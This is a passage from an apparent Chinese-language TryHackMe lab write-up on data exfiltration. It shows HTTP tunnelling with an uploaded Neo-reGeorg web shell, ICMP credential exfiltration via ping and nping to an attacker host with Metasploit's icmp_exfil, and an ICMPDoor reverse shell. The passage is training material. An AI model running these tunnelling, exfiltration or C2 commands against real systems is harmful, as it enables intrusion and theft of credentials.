<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009662.png" alt></p>
<p>在本节中，我们将创建一个 HTTP 隧道通信通道，以进入内部网络并通过 HTTP 协议与本地网络设备进行通信。假设我们发现了一个网络应用程序，可以让我们将 HTTP 隧道代理文件上传到受害者网络服务器 <a target="_blank" rel="noopener" href="http://uploader.thm.com">uploader.thm.com</a>。上传并连接到它后，我们将能够与 <a target="_blank" rel="noopener" href="http://app.thm.com">app.thm.com</a> 进行通信。</p>
<p>对于 HTTP 隧道，我们将使用 <a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a> 工具建立通信通道来访问内部网络设备。我们已经在AttackBox中安装了该工具（我安装在kali上了）</p>
<p>接下来，我们需要生成一个加密的客户端文件并将其上传到受害者的 Web 服务器，如下所示：</p>
<pre><code class="hljs shell">root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&amp;  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$&lt;
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '&lt;@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       =&gt; neoreg_servers/tunnel.aspx
       =&gt; neoreg_servers/tunnel.ashx
       =&gt; neoreg_servers/tunnel.jsp
       =&gt; neoreg_servers/tunnel_compatibility.jsp
       =&gt; neoreg_servers/tunnel.jspx
       =&gt; neoreg_servers/tunnel_compatibility.jspx
       =&gt; neoreg_servers/tunnel.php</code></pre>
<p>前面的命令使用 neoreg_servers/ 目录中的 thm 密钥生成加密的隧道客户端。请注意，有各种可用的扩展，包括 PHP、ASPX、JSP 等。在我们的场景中，我们将通过上传器计算机上传tunnel.php 文件。要访问上传器机器，您可以访问以下 URL：<a target="_blank" rel="noopener" href="http://10.10.41.88/uploader">http://10.10.41.88/uploader</a> 或 <a target="_blank" rel="noopener" href="https://10-10-41-88.p.thmlabs.com/uploader%EF%BC%8C%E6%97%A0%E9%9C%80">https://10-10-41-88.p.thmlabs.com/uploader，无需</a> VPN<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009663.png" alt></p>
<p>要上传 PHP 文件，请使用 admin 作为密钥，以便您将任何文件上传到 <a target="_blank" rel="noopener" href="http://uploader.thm.com">uploader.thm.com</a>。上传文件后，我们可以通过以下 URL 访问它：<a target="_blank" rel="noopener" href="http://10.10.41.88/uploader/files/tunnel.php">http://10.10.41.88/uploader/files/tunnel.php</a></p>
<p>我们需要使用 <a target="_blank" rel="noopener" href="http://neoreg.py">neoreg.py</a> 连接到客户端并提供解密隧道客户端的密钥。我们还需要提供我们在上传机器上上传的 PHP 文件的 URL。</p>
<p>一旦连接到隧道客户端，我们就可以使用隧道连接作为本地计算机上的代理绑定，端口 1080 上的 127.0.0.1。</p>
<p>例如，如果我们要访问 <a target="_blank" rel="noopener" href="http://app.thm.com">app.thm.com</a>，其内部 IP 地址为 172.20.0.121，端口为 80，我们可以使用带有 --socks5 参数的curl 命令。我们还可以使用其他代理应用程序，例如ProxyChains、FoxyProxy等来与内部网络进行通信。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>:~$ curl --socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1080</span> <span class="hljs-attribute">http</span>://<span class="hljs-number">172.20</span>.<span class="hljs-number">0.121</span>:<span class="hljs-number">80</span>
Welcome to APP Server!</code></pre>
<p>下图显示了流量通过上传机器，然后与内部网络设备（在本例中为应用程序机器）通信的情况。请注意，如果我们检查来自 App 机器的网络流量，我们会看到传入流量的源 IP 地址来自上传者机器。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009664.png" alt></p>
<p>现在复制 HTTP 隧道步骤，通过 HTTP 协议建立隧道，以 172.20.0.120 作为端口 80 上的 IP 地址与 <a target="_blank" rel="noopener" href="http://flag.thm.com">flag.thm.com</a> 进行通信。请注意，如果您从同一网络内的其他计算机访问 <a target="_blank" rel="noopener" href="http://flag.thm.com">flag.thm.com</a> 网站，网络，你不会得到标志。<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009665.png" alt><br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009666.png" alt></p>
<h1 id="0x07-使用-icmp-渗透">0x07 使用 ICMP 渗透</h1>
<p>在此任务中，我们将展示如何使用 ICMP 协议窃取数据。 ICMP 代表互联网控制消息协议，它是用于处理错误报告的网络层协议。如果您需要有关 ICMP 和计算机网络基础知识的更多信息，您可以访问以下 THM 室：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/whatisnetworking">什么是网络</a>。</p>
<p>路由器等网络设备使用 ICMP 协议来检查设备之间的网络连接。请注意，ICMP 协议不是在设备之间发送数据的传输协议。假设两台主机需要测试网络中的连通性；然后，我们可以使用 ping 命令通过网络发送 ICMP 数据包，如下图所示。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009667.png" alt></p>
<p>HOST1 发送带有回显请求数据包的 ICMP 数据包。然后，如果 HOST2 可用，它会发回一个 ICMP 数据包，其中包含确认可用性的回显应答消息。</p>
<h2 id="icmp-数据部分">ICMP 数据部分</h2>
<p>在较高级别上，ICMP 数据包的结构包含一个数据部分，其中可以包含字符串或其他信息的副本，例如用于错误消息的 IPv4 标头。下图显示了数据部分，该部分是可选使用的。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009668.png" alt></p>
<p>请注意，数据字段是可选的，可以为空，也可以在通信期间包含随机字符串。作为攻击者，我们可以使用 ICMP 结构将我们的数据包含在数据部分中，并通过 ICMP 数据包将其发送到另一台机器。另一台机器必须捕获带有 ICMP 数据包的网络流量才能接收数据。</p>
<p>要执行手动 ICMP 数据过滤，我们需要更多地讨论 ping 命令。 ping 命令是任何操作系统中都可用的网络管理员软件。它用于通过发送ICMP数据包来检查可达性和可用性，可以如下使用：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@AttackBox</span>$ ping <span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -c <span class="hljs-number">1</span></code></pre>
<p>我们选择使用上一个命令中的 -c 1 参数，从主机 1（我们的 AttackBox）发送一个 ICMP 数据包到主机 2（目标机器）。现在让我们检查 Wireshark 中的 ICMP 数据包，看看数据部分是什么样的。<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009669.png" alt></p>
<p>Wireshark 截图显示，数据部分已被随机字符串选中。需要注意的是，此部分可能填充了需要传输到另一台机器的数据。</p>
<p>Linux 操作系统中的 ping 命令有一个有趣的 ICMP 选项。使用 -p 参数，我们可以以十六进制表示形式指定要通过数据包发送的 16 字节数据。请注意，-p 选项仅适用于 Linux 操作系统。我们可以通过查看 ping 的帮助手册页来确认</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009670.png" alt></p>
<p>假设我们需要窃取以下凭据 thm:tryhackme。首先，我们需要将其转换为十六进制表示形式，然后使用 -p 选项将其传递给 ping 命令，如下所示：</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ echo <span class="hljs-string">"thm:tryhackme"</span> | xxd -p 
<span class="hljs-number">74686</span>d3a7472796861636b6d650a

`xxd` 是一个十六进制编辑器，它可以将二进制数据转换为十六进制表示，或者将十六进制表示转换回二进制数据。

- **`-p`**：`xxd` 的选项，表示以纯十六进制字符输出（plain hexdump style），即每个字节用两个十六进制字符表示，并且输出中不包含额外的信息如偏移量或ASCII表示。</code></pre>
<p>我们使用 xxd 命令将字符串转换为十六进制，然后我们可以使用 ping 命令以及转换 thm:tryhackme 得到的十六进制值。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ping <span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -c <span class="hljs-number">1</span> -p <span class="hljs-number">74686</span>d3a7472796861636b6d650a</code></pre>
<p>我们使用 ping 命令和 thm:tryhackme 数据发送了一个 ICMP 数据包。让我们看看 Wireshark 中该数据包的数据部分。<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009671.png" alt></p>
<p>出色的！我们已经成功地用我们的数据填充了 ICMP 的数据部分，并使用 ping 命令通过网络手动发送它。</p>
<h2 id="icmp-数据泄露">ICMP 数据泄露</h2>
<p>现在我们已经掌握了通过 ICMP 数据包手动发送数据的基本原理，接下来我们讨论如何使用 Metasploit 来窃取数据。 Metasploit 框架使用上一节中解释的相同技术。但是，它将捕获传入的 ICMP 数据包并等待文件开始 (BOF) 触发值。一旦收到，它就会写入磁盘，直到获得文件结束 (EOF) 触发值。下图显示了 Metasploit 框架所需的步骤。由于我们需要 Metasploit 框架来实现此技术，因此我们需要 AttackBox 机器才能成功执行此攻击。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009672.png" alt></p>
<p>现在，在 AttackBox 中，我们通过选择 icmp_exfil 模块来设置 Metasploit 框架，使其准备好捕获和侦听 ICMP 流量。该模块的要求之一是设置基于 TCPDUMP 规则的 BPF_FILTER 选项，以仅捕获 ICMP 数据包并忽略任何具有攻击机器源 IP 的 ICMP 数据包，如下所示：</p>
<pre><code class="hljs scss">msf5 &gt; use auxiliary/server/icmp_exfil
msf5 <span class="hljs-built_in">auxiliary</span>(server/icmp_exfil) &gt; set BPF_FILTER icmp and not <span class="hljs-attribute">src</span> ATTACKBOX_IP
BPF_FILTER =&gt; icmp and not <span class="hljs-attribute">src</span> ATTACKBOX_IP</code></pre>
<p>我们还需要选择要监听的网络接口 eth0（但我这里是tun0）。最后执行run来启动模块。</p>
<pre><code class="hljs scss">msf5 <span class="hljs-built_in">auxiliary</span>(server/icmp_exfil) &gt; set INTERFACE eth0
INTERFACE =&gt; eth0
msf5 <span class="hljs-built_in">auxiliary</span>(server/icmp_exfil) &gt; run
    
<span class="hljs-selector-attr">[*]</span> ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
<span class="hljs-selector-attr">[*]</span> Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)</code></pre>
<p>我们准备了 <a target="_blank" rel="noopener" href="http://icmp.thm.com">icmp.thm.com</a> 作为受害者机器，使用所需的工具完成 ICMP 任务。从 JumpBox 中，使用 thm:tryhackme 凭据登录到 <a target="_blank" rel="noopener" href="http://icmp.thm.com">icmp.thm.com</a>。</p>
<p>我们预装了 <a target="_blank" rel="noopener" href="https://nmap.org/nping/">nping</a> 工具，这是一个用于网络数据包生成、响应分析和响应时间测量的开源工具。 NPING 工具是 NMAP 套件工具的一部分。</p>
<p>首先，我们将从 ICMP 机器发送 BOF 触发器，以便 Metasploit 框架开始写入磁盘。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ ssh thm<span class="hljs-keyword">@icmp</span>.thm.com
thm<span class="hljs-keyword">@icmp-host</span>:~# sudo nping --icmp -c <span class="hljs-number">1</span> ATTACKBOX_IP --data-string <span class="hljs-string">"BOFfile.txt"</span>
    
Starting Nping <span class="hljs-number">0.7</span>.<span class="hljs-number">80</span> ( <span class="hljs-attribute">https</span>://nmap.org/nping ) at <span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">23</span> EEST
SENT (<span class="hljs-number">0.0369s</span>) ICMP [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> &gt; ATTACKBOX_IP Echo request (type=<span class="hljs-number">8</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">7785</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">64</span> id=<span class="hljs-number">40595</span> iplen=<span class="hljs-number">39</span> ]
RCVD (<span class="hljs-number">0.0376s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">7785</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">63</span> id=<span class="hljs-number">12656</span> iplen=<span class="hljs-number">39</span> ]
RCVD (<span class="hljs-number">0.0755s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">7785</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">31</span> id=<span class="hljs-number">60759</span> iplen=<span class="hljs-number">32</span> ]
    
Max <span class="hljs-attribute">rtt</span>: <span class="hljs-number">38.577ms</span> | Min <span class="hljs-attribute">rtt</span>: <span class="hljs-number">0.636ms</span> | Avg <span class="hljs-attribute">rtt</span>: <span class="hljs-number">19.606ms</span>
Raw packets <span class="hljs-attribute">sent</span>: <span class="hljs-number">1</span> (<span class="hljs-number">39</span>B) | <span class="hljs-attribute">Rcvd</span>: <span class="hljs-number">2</span> (<span class="hljs-number">71</span>B) | <span class="hljs-attribute">Lost</span>: <span class="hljs-number">0</span> (<span class="hljs-number">0.00%</span>)
Nping <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address pinged in <span class="hljs-number">1.06</span> seconds</code></pre>
<p>我们使用带有 --data-string 参数的 nping 命令发送了一个 ICMP 数据包。我们使用文件名 BOFfile.txt 指定触发器值，该文件名是 Metasploit 框架中默认设置的。如果需要，可以从 Metasploit 更改此设置！</p>
<p>现在检查 AttackBox 终端。如果一切设置正确，Metasploit 框架应该识别触发器值并等待数据写入磁盘。</p>
<p>让我们开始从 ICMP 机器发送所需的数据和文件结束触发值。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@icmp-host</span>:~# sudo nping --icmp -c <span class="hljs-number">1</span> ATTACKBOX_IP --data-string <span class="hljs-string">"admin:password"</span>
    
Starting Nping <span class="hljs-number">0.7</span>.<span class="hljs-number">80</span> ( <span class="hljs-attribute">https</span>://nmap.org/nping ) at <span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">23</span> EEST
SENT (<span class="hljs-number">0.0312s</span>) ICMP [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> &gt; ATTACKBOX_IP Echo request (type=<span class="hljs-number">8</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">14633</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">64</span> id=<span class="hljs-number">13497</span> iplen=<span class="hljs-number">42</span> ]
RCVD (<span class="hljs-number">0.0328s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">14633</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">63</span> id=<span class="hljs-number">17031</span> iplen=<span class="hljs-number">42</span> ]
RCVD (<span class="hljs-number">0.0703s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">14633</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">31</span> id=<span class="hljs-number">41138</span> iplen=<span class="hljs-number">30</span> ]
    
Max <span class="hljs-attribute">rtt</span>: <span class="hljs-number">39.127ms</span> | Min <span class="hljs-attribute">rtt</span>: <span class="hljs-number">1.589ms</span> | Avg <span class="hljs-attribute">rtt</span>: <span class="hljs-number">20.358ms</span>
Raw packets <span class="hljs-attribute">sent</span>: <span class="hljs-number">1</span> (<span class="hljs-number">42</span>B) | <span class="hljs-attribute">Rcvd</span>: <span class="hljs-number">2</span> (<span class="hljs-number">72</span>B) | <span class="hljs-attribute">Lost</span>: <span class="hljs-number">0</span> (<span class="hljs-number">0.00%</span>)
Nping <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address pinged in <span class="hljs-number">1.06</span> seconds 
    
thm<span class="hljs-keyword">@icmp-host</span>:~# sudo nping --icmp -c <span class="hljs-number">1</span> ATTACKBOX_IP --data-string <span class="hljs-string">"admin2:password2"</span>
    
Starting Nping <span class="hljs-number">0.7</span>.<span class="hljs-number">80</span> ( <span class="hljs-attribute">https</span>://nmap.org/nping ) at <span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">24</span> EEST
SENT (<span class="hljs-number">0.0354s</span>) ICMP [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> &gt; ATTACKBOX_IP Echo request (type=<span class="hljs-number">8</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">39051</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">64</span> id=<span class="hljs-number">32661</span> iplen=<span class="hljs-number">44</span> ]
RCVD (<span class="hljs-number">0.0358s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">39051</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">63</span> id=<span class="hljs-number">18581</span> iplen=<span class="hljs-number">44</span> ]
RCVD (<span class="hljs-number">0.0748s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">39051</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">31</span> id=<span class="hljs-number">2149</span> iplen=<span class="hljs-number">30</span> ]
    
Max <span class="hljs-attribute">rtt</span>: <span class="hljs-number">39.312ms</span> | Min <span class="hljs-attribute">rtt</span>: <span class="hljs-number">0.371ms</span> | Avg <span class="hljs-attribute">rtt</span>: <span class="hljs-number">19.841ms</span>
Raw packets <span class="hljs-attribute">sent</span>: <span class="hljs-number">1</span> (<span class="hljs-number">44</span>B) | <span class="hljs-attribute">Rcvd</span>: <span class="hljs-number">2</span> (<span class="hljs-number">74</span>B) | <span class="hljs-attribute">Lost</span>: <span class="hljs-number">0</span> (<span class="hljs-number">0.00%</span>)
Nping <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address pinged in <span class="hljs-number">1.07</span> seconds 
    
thm<span class="hljs-keyword">@icmp-host</span>:~# sudo nping --icmp -c <span class="hljs-number">1</span> ATTACKBOX_IP --data-string <span class="hljs-string">"EOF"</span>
    
Starting Nping <span class="hljs-number">0.7</span>.<span class="hljs-number">80</span> ( <span class="hljs-attribute">https</span>://nmap.org/nping ) at <span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">24</span> EEST
SENT (<span class="hljs-number">0.0364s</span>) ICMP [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> &gt; ATTACKBOX_IP Echo request (type=<span class="hljs-number">8</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">33619</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">64</span> id=<span class="hljs-number">51488</span> iplen=<span class="hljs-number">31</span> ]
RCVD (<span class="hljs-number">0.0369s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">33619</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">63</span> id=<span class="hljs-number">19671</span> iplen=<span class="hljs-number">31</span> ]
RCVD (<span class="hljs-number">0.3760s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">33619</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">31</span> id=<span class="hljs-number">1003</span> iplen=<span class="hljs-number">36</span> ]
    
Max <span class="hljs-attribute">rtt</span>: <span class="hljs-number">339.555ms</span> | Min <span class="hljs-attribute">rtt</span>: <span class="hljs-number">0.391ms</span> | Avg <span class="hljs-attribute">rtt</span>: <span class="hljs-number">169.973ms</span>
Raw packets <span class="hljs-attribute">sent</span>: <span class="hljs-number">1</span> (<span class="hljs-number">31</span>B) | <span class="hljs-attribute">Rcvd</span>: <span class="hljs-number">2</span> (<span class="hljs-number">67</span>B) | <span class="hljs-attribute">Lost</span>: <span class="hljs-number">0</span> (<span class="hljs-number">0.00%</span>)
Nping <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address pinged in <span class="hljs-number">1.07</span> seconds
thm<span class="hljs-keyword">@icmp-host</span>:~#</code></pre>
<p>发送完数据和结束触发值后，让我们检查一下 AttackBox。</p>
<pre><code class="hljs scss">msf5 <span class="hljs-built_in">auxiliary</span>(server/icmp_exfil) &gt; run
    
<span class="hljs-selector-attr">[*]</span> ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
<span class="hljs-selector-attr">[*]</span> Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
<span class="hljs-selector-attr">[+]</span> Beginning capture of "file<span class="hljs-selector-class">.txt</span>" data
<span class="hljs-selector-attr">[*]</span> <span class="hljs-number">30</span> bytes of data received in total
<span class="hljs-selector-attr">[+]</span> End of File received. Saving "file<span class="hljs-selector-class">.txt</span>" to loot
<span class="hljs-selector-attr">[+]</span> Incoming file "file<span class="hljs-selector-class">.txt</span>" saved to loot
<span class="hljs-selector-attr">[+]</span> Loot filename: /root/.msf4/loot/<span class="hljs-number">20220425212408</span>_default_ATTACKBOX_IP_icmp_exfil_838825.txt</code></pre>
<p>好的！我们已经使用 Metasploit 框架成功通过 ICMP 协议传输数据。您可以检查终端中提到的战利品文件来确认收到的数据。</p>
<h2 id="icmp-c2-通信">ICMP C2 通信</h2>
<p>接下来，我们将展示使用 <a target="_blank" rel="noopener" href="https://github.com/krabelize/icmpdoor">ICMPDoor</a> 工具通过 ICMP 协议执行命令。 ICMPDoor 是一个用 Python3 和 scapy 编写的开源反向 shell。该工具使用我们在本任务前面讨论的相同概念，其中攻击者利用 ICMP 数据包中的数据部分。唯一的区别是攻击者发送需要在受害者机器上执行的命令。一旦命令被执行，受害机器就会在数据部分的 ICMP 数据包中发送执行输出。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009673.png" alt></p>
<p>我们已经准备好了在 JumpBox 和 ICMP 主机上通过 ICMP 协议进行 C2 通信所需的工具。首先，<a target="_blank" rel="noopener" href="http://xn--ICMPicmp-or1mv3ytpmj30a72hvysn47cjv9ce75b.thm.com">我们需要登录到ICMP机器icmp.thm.com</a>，并执行icmpdoor二进制文件，如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@icmp-host</span>:~$ sudo icmpdoor -i eth0 -d <span class="hljs-number">192.168</span>.<span class="hljs-number">0.133</span></code></pre>
<p>请注意，我们指定了通信的接口以及服务器端的目标 IP。</p>
<p>接下来，登录到 JumpBox 并执行 icmp-cnc 二进制文件以与受害者（我们的 ICMP 主机）进行通信。一旦执行正确运行，就会通过 ICMP 协议建立通信通道。现在我们准备发送需要在受害机器上执行的命令。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$  sudo icmp-cnc -i eth1 -d <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span>
<span class="hljs-attribute">shell</span>: hostname
hostname
<span class="hljs-attribute">shell</span>: icmp-host</code></pre>
<p>与客户端二进制文件类似，确保选择通信接口以及目标 IP。正如前面的终端所示，我们请求执行 hostname 命令，并且收到了 icmp-host。</p>
<p>为了确认所有通信都经过 ICMP 协议，我们使用 tcpdump 捕获通信过程中的网络流量，如下所示：</p>
